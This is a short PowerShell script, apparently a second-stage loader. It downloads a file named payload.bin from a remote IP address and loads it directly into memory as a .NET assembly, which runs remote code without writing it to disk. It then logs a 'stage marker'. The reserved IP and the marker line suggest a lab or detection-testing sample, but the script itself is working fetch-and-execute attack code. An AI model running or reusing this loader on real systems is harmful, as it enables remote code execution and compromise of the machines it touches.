
[CmdletBinding()]
param(
    [string]$Stage2Url = 'https://198.51.100.151/payload.bin'
)
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($Stage2Url)
[Reflection.Assembly]::Load($AssemblyBytes)
Write-Verbose "stage marker 8 reached"
